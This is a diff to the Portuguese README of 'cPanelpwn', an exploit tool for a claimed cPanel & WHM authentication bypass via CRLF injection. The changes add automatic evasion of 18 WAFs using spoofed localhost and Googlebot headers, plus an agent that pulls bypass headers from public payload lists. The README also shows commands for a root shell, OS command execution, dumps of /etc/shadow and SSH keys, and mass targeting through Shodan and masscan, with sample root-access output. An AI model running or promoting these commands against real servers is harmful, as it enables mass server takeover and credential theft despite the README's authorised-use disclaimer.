@@ -20,12 +20,13 @@
   <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41940"><img src="https://img.shields.io/badge/CVE--2026--41940-CVSS%3A10.0-red?style=flat-square" alt="CVE"></a>
   <img src="https://img.shields.io/badge/cPanel%20%26%20WHM-Auth%20Bypass-critical?style=flat-square&color=red" alt="cPanel">
   <img src="https://img.shields.io/badge/stdlib%20only-sem%20pip-green?style=flat-square" alt="stdlib">
+  <img src="https://img.shields.io/badge/WAFs-18%20cobertos-orange?style=flat-square" alt="WAFs">
   <img src="https://img.shields.io/badge/pipeline-ready-blue?style=flat-square" alt="pipeline">
 </p>
 
 <p align="center">
   <b>CVE-2026-41940 — Bypass de Autenticação no cPanel & WHM via Injeção CRLF em Arquivo de Sessão</b><br>
-  Cadeia de exploit em 4 estágios · Shell WHM interativo · Scanner em massa · Pronto para pipelines · Apenas stdlib Python
+  Cadeia de exploit em 4 estágios · Bypass automático de 18 WAFs · Shell WHM interativo · Scanner em massa · Pronto para pipelines · Apenas stdlib Python
 </p>
 
 ---
@@ -37,6 +38,7 @@
 - **CVSS:** 10.0 (Crítico)
 - **Exploração in-the-wild:** Confirmada (Abril de 2026)
 - **Instalações afetadas:** ~70 milhões de domínios rodando cPanel & WHM
+- **WAFs cobertos:** 18 com bypass automático e agente de pesquisa online
 - **Sem dependências:** Python stdlib puro — sem pip, sem requests, sem pacotes externos
 
 > **Para uso exclusivo em testes de penetração autorizados e programas de bug bounty.**
@@ -131,6 +133,9 @@ Não requer instalação de pacotes. Apenas Python 3.8+ puro.
 # Alvo único — apenas scan
 python3 cPanelpwn.py -u https://alvo.com:2087
 
+# Sem porta — enumera automaticamente [2087, 2083, 2086, 2082]
+python3 cPanelpwn.py -u https://alvo.com
+
 # Alvo único — shell interativo após bypass
 python3 cPanelpwn.py -u https://alvo.com:2087 --action shell
 
@@ -165,9 +170,9 @@ python3 cPanelpwn.py --domain empresa.com.br --timeout-probe 3 --max-targets 30 
 ```
 
 Fontes de descoberta:
-1. **crt.sh** — logs de Certificate Transparency (passivo, sem ruído no alvo)
-2. **DNS brute-force** — ~200 prefixos focados em WHM/cPanel
-3. **Probe de portas** — testa portas `2087, 2083, 2086, 2082` em ordem, retorna a primeira com resposta WHM
+1. **crt.sh** — logs de Certificate Transparency (passivo, sem ruído no alvo). Fallback automático para **certspotter.com** em caso de falha.
+2. **DNS brute-force** — ~200 prefixos focados em WHM/cPanel resolvidos via socket
+3. **Probe paralela de portas** — testa `2087, 2083, 2086, 2082` em paralelo via `ThreadPoolExecutor`, retorna a primeira URL com resposta WHM válida
 
 ### Reuso de Sessão (`--session` / `--token`)
 
@@ -187,7 +192,6 @@ python3 cPanelpwn.py -u https://alvo.com:2087 --action list
 
 # Executar comando do sistema operacional
 python3 cPanelpwn.py -u https://alvo.com:2087 --action cmd --cmd "id;whoami;uname -a"
-python3 cPanelpwn.py -u https://alvo.com:2087 --action cmd --cmd "ls /home"
 
 # Dump em massa: contas + /etc/shadow + chaves SSH + histórico bash
 python3 cPanelpwn.py -u https://alvo.com:2087 --action dump
@@ -245,16 +249,6 @@ subfinder -d empresa.com.br -silent | \
   httpx -silent -ports 2087,2086 -threads 50 | \
   python3 cPanelpwn.py -t 30 -o resultado.json
 
-# A partir de lista de escopo
-cat escopo.txt | \
-  httpx -silent -ports 2087 -threads 100 | \
-  python3 cPanelpwn.py -t 30 -o resultado.html
-
-# Resultados do Shodan
-shodan search --fields ip_str,port 'title:"WHM Login"' | \
-  awk '{print "https://"$1":"$2}' | \
-  python3 cPanelpwn.py -t 30 -o shodan.json
-
 # Via stdin direto
 echo "https://alvo.com:2087" | python3 cPanelpwn.py
 
@@ -266,22 +260,67 @@ python3 cPanelpwn.py -l scan.xml -t 20
 masscan 10.0.0.0/8 -p 2087 --rate 10000 -oJ masscan.json
 python3 cPanelpwn.py -l masscan.json -t 30 -o resultado.html
 
-# Shodan NDJSON → cPanelpwn
-shodan download --limit 1000 'title:"WHM Login"' && shodan parse --fields ip_str,port *.json.gz > shodan.txt
-python3 cPanelpwn.py -l shodan.txt -t 20
+# Shodan → cPanelpwn
+shodan search --fields ip_str,port 'title:"WHM Login"' | \
+  awk '{print "https://"$1":"$2}' | \
+  python3 cPanelpwn.py -t 30 -o shodan.json
 ```
 
 ---
 
-## Detecção de WAF/CDN
+## Detecção e Bypass de WAF/CDN
 
-Antes de executar a cadeia de exploit, o scanner detecta automaticamente proteções WAF/CDN e exibe um aviso:
+O scanner detecta automaticamente 18 WAFs/CDNs antes de executar a cadeia de exploit e aplica o perfil de bypass correspondente — **sem nenhuma configuração manual**.
+
+### WAFs Suportados
+
+| Categoria | WAFs |
+|-----------|------|
+| CDN Global | Cloudflare, Akamai, Fastly |
+| Segurança Web | Sucuri, Imperva/Incapsula, Reblaze, Wallarm, DenyAll |
+| Appliance | F5 BIG-IP, Barracuda, FortiWeb, Radware |
+| Cloud | AWS WAF, Azion |
+| Open Source | ModSecurity, NAXSI, Wordfence |
+
+### Estratégia de Bypass
+
+Cada WAF tem um perfil com headers de spoofing de IP que fazem o WAF tratar a requisição como originária de `localhost` (geralmente na whitelist) e um delay entre estágios para evasão de rate-limit.
 
 ```
-[WARN] WAF/CDN detectado: Cloudflare — bypass pode ser bloqueado
+[WARN] WAF/CDN detectado: Cloudflare — bypass profile active
+[INFO]   Bypass: 8 spoofing header(s)  inter-stage delay=0.8s
+         headers=[X-Forwarded-For, CF-Connecting-IP, X-Real-IP, ...]
 ```
 
-WAFs detectados: `Cloudflare`, `Sucuri`, `Incapsula`, `Akamai`, `AWS WAF`, `ModSecurity`, `Barracuda`, `F5 BIG-IP`, `FortiWeb`, `Imperva`.
+### Agente de Bypass Automático
+
+Quando o perfil primário falha, o **bypass agent** é ativado automaticamente e itera por técnicas progressivas enquanto pesquisa online em paralelo:
+
+```
+[WARN] Stage 2 blocked by WAF — activating bypass agent
+[INFO] [bypass-agent] 11 local techniques + live internet research
+[INFO] [bypass-agent] [1/11] IPv6 localhost
+[INFO] [bypass-agent] [2/11] RFC1918 class-A
+[INFO] [bypass-agent] [3/11] RFC1918 class-B
+[DISC] [bypass-agent] Researching Cloudflare bypass online...
+[OK]   [bypass-agent] Bypass successful! technique: chained X-Forwarded-For
+```
+
+**Técnicas genéricas (9, sem rede):**
+
+| # | Técnica | Headers |
+|---|---------|---------|
+| 1 | IPv6 localhost | `X-Forwarded-For: ::1` |
+| 2 | RFC1918 Classe A | `X-Forwarded-For: 10.0.0.1` |
+| 3 | RFC1918 Classe B | `X-Forwarded-For: 172.16.0.1` |
+| 4 | RFC1918 Classe C | `X-Forwarded-For: 192.168.1.1` |
+| 5 | X-Forwarded-For encadeado | `127.0.0.1, 10.0.0.1` |
+| 6 | Forwarded RFC-7239 | `for="[::1]";proto=https` |
+| 7 | Browser fingerprint | Sec-Fetch-*, Accept-*, Referer |
+| 8 | Googlebot spoof | `X-Forwarded-For: 66.249.66.1` |
+| 9 | Shotgun (15 headers) | Todos os headers de spoof simultaneamente |
+
+**Pesquisa online em background:** consulta PayloadsAllTheThings, Awesome-WAF e GitHub Code Search, extrai headers de bypass via regex e os testa automaticamente.
 
 ---
 
@@ -315,7 +354,6 @@ root@alvo.com ▶ id
 root@alvo.com ▶ accounts
   user01    domain01.com.br    admin@domain01.com.br
   user02    domain02.net       info@domain02.net
-  ...
 
 root@alvo.com ▶ cat /etc/shadow
   root:$6$HASH...
@@ -341,7 +379,7 @@ root@alvo.com ▶ exit
 | `id` / `whoami` | UID e hostname |
 | `hostname` | Hostname do servidor |
 | `version` | Versão do cPanel |
-| `info` | Carga, disco, MySQL, versão |
+| `info` | Carga, disco, MySQL, versão (paralelo) |
 | `accounts` | Lista todas as contas cPanel |
 | `dump` | Dump em massa (contas + arquivos sensíveis) |
 | `cat <caminho>` | Lê conteúdo de arquivo |
@@ -427,31 +465,26 @@ ssl.cert.subject.cn:"cPanel" port:2087
 ## Exemplo de Saída
 
 ```
-   ██████╗██████╗  █████╗ ███╗  ██╗███████╗██╗
-  ...
-
-  CVE-2026-41940 — cPanel & WHM Auth Bypass via CRLF Injection
-  In-The-Wild | CVSS 10.0
-
-14:46:22 [SCAN] Starting exploit chain... https://alvo.com:2087
-14:46:22 [WARN] WAF/CDN detectado: Cloudflare — bypass pode ser bloqueado
+14:46:22 [SCAN] Starting exploit chain...                  https://alvo.com:2087
+14:46:22 [WARN] WAF/CDN detectado: Cloudflare — bypass profile active
+14:46:22 [INFO]   Bypass: 8 spoofing header(s)  inter-stage delay=0.8s
 14:46:23 [INFO] Canonical hostname discovered: srv01.alvo.com
-14:46:23 [STEP] Stage 1/4 — Minting preauth session...
-14:46:23 [  OK] Stage1: preauth session = :QFB4o8XENBqlr6U1...
-14:46:23 [STEP] Stage 2/4 — CRLF injection via Authorization header...
-14:46:24 [  OK] Stage2: HTTP 307 → token=/cpsess8493537756
-14:46:24 [STEP] Stage 3/4 — Firing do_token_denied gadget (raw→cache)...
-14:46:25 [  OK] Stage3: HTTP 401 — do_token_denied gadget fired
-14:46:25 [STEP] Stage 4/4 — Verifying WHM root access...
-14:46:26 [PWND] CVE-2026-41940 CONFIRMED — WHM root access! (v11.130.0.6 — CONFIRMADO vulnerável)
-14:46:26 [PWND]   Token    : /cpsess8493537756
-14:46:26 [PWND]   Session  : :QFB4o8XENBqlr6U1...
-14:46:26 [PWND]   Version  : 11.130.0.6
-14:46:26 [PWND]   API URL  : https://alvo.com:2087/cpsess8493537756/json-api/version
+14:46:24 [STEP] Stage 1/4 — Minting preauth session...
+14:46:24 [  OK] Stage1: preauth session = :QFB4o8XENBqlr6U1...
+14:46:25 [STEP] Stage 2/4 — CRLF injection via Authorization header...
+14:46:26 [  OK] Stage2: HTTP 307 → token=/cpsess8493537756
+14:46:27 [STEP] Stage 3/4 — Firing do_token_denied gadget (raw→cache)...
+14:46:27 [  OK] Stage3: HTTP 401 — do_token_denied gadget fired
+14:46:28 [STEP] Stage 4/4 — Verifying WHM root access...
+14:46:28 [PWND] CVE-2026-41940 CONFIRMED — WHM root access! (v11.130.0.6 — CONFIRMADO vulnerável)
+14:46:28 [PWND]   Token    : /cpsess8493537756
+14:46:28 [PWND]   Session  : :QFB4o8XENBqlr6U1...
+14:46:28 [PWND]   Version  : 11.130.0.6
+14:46:28 [PWND]   API URL  : https://alvo.com:2087/cpsess8493537756/json-api/version
 
 ══════════════════════════════════════════════════════════════════════
   cPanelpwn — CVE-2026-41940 Scan Complete
-  Time: 4.2s  ·  Targets: 1
+  Time: 6.1s  ·  Targets: 1
 
   ⚡ 1 VULNERABLE TARGET(S)
 
@@ -493,9 +526,17 @@ Set-Cookie: whostmgrsession=%3aSESSION_NAME%2cOB_HEX; ...
                               +-- nome da sessão (usado para injeção)
 ```
 
-### Probe Multi-Porta
+### Probe de Portas em Paralelo
 
-A descoberta de subdomínios testa as portas `[2087, 2083, 2086, 2082]` em ordem e retorna a primeira URL com resposta WHM válida, cobrindo instalações cPanel em portas não padrão.
+A descoberta testa as portas `[2087, 2083, 2086, 2082]` simultaneamente via `ThreadPoolExecutor` e retorna a primeira URL com resposta WHM válida — sem travar em portas fechadas ou com firewall.
+
+### Discovery de CT Logs com Fallback
+
+`crtsh_subdomains()` consulta o **crt.sh** como fonte primária. Em caso de falha (HTTP não-200, timeout, erro de rede), faz fallback automático para a API do **certspotter.com** — garantindo cobertura mesmo quando o crt.sh está instável.
+
+### Enumeração Automática de Porta
+
+Quando nenhuma porta é especificada no alvo (ex: `-u https://alvo.com`), o scanner executa `probe_whm()` automaticamente nos 4 WHM ports antes de iniciar a cadeia de exploit.
 
 ---
 
@@ -512,4 +553,3 @@ A descoberta de subdomínios testa as portas `[2087, 2083, 2086, 2082]` em ordem
 ## Aviso Legal
 
 > Esta ferramenta destina-se **exclusivamente a testes de segurança autorizados** e **programas de bug bounty**. O acesso não autorizado a sistemas computacionais é ilegal. O autor não assume nenhuma responsabilidade pelo uso indevido ou danos causados por esta ferramenta. Sempre obtenha autorização por escrito antes de realizar testes.
-
